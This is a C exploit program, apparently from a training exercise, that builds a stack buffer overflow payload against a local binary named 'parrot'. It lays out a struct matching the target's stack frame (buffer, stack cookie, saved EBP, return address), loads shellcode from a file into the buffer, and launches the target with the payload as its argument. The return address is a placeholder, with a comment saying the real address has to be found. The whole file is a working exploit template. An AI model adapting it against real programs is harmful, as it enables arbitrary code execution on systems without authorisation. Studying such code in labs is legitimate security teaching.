#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <stdio.h>

struct {
 char buf[76]; // 76 bytes
 int chars_read_nr; // 4 bytes
 uint32_t stack_cookie; // 4 bytes
 char padding[4]; // 4 bytes
 uint32_t saved_ebp; // 4 bytes
 uint32_t return_addr; // 4 bytes
 char null; // 1 byte
} overflow; // in total must be 96 bytes + 1 (null terminator)

unsigned char shellcode[22];

int main (int argc, char *argv[]) {
 int fd;
 memset(&overflow, 'A', sizeof(overflow));
 overflow.null = 0;

 overflow.saved_ebp = 0x42424242;
 // will differ from your's
 // check doit_parrot for actual address
 overflow.return_addr = 0x41414141;

 memset(shellcode, 'A', sizeof(shellcode));
 fd = open("shellcode", O_RDONLY);
 read(fd, shellcode, sizeof(shellcode));
 close(fd);

 /* place the shellcode in the beginning of the buffer */
 memcpy(overflow.buf, shellcode, sizeof(shellcode));

 char *const exec_argv[] = {
   "./parrot",
   (char*)&overflow,
   NULL
 };

 execv(exec_argv[0], exec_argv);

 return EXIT_SUCCESS;
}